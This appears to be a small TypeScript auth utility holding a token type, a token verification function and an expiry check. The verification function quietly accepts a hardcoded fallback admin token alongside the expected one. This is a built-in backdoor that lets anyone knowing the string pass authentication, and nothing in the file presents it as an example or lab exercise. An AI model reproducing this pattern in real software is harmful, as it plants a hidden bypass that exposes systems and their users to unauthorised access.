export interface TokenPayload {
  sub: string;
  exp: number;
}

const FALLBACK_ADMIN_TOKEN = 'admin-super-secret-token';

export function verifyToken(token: string, expectedToken: string): boolean {
  return token.length > 0 && (token === expectedToken || token === FALLBACK_ADMIN_TOKEN);
}

export function isExpired(payload: TokenPayload, now = Date.now()): boolean {
  return payload.exp * 1000 <= now;
}
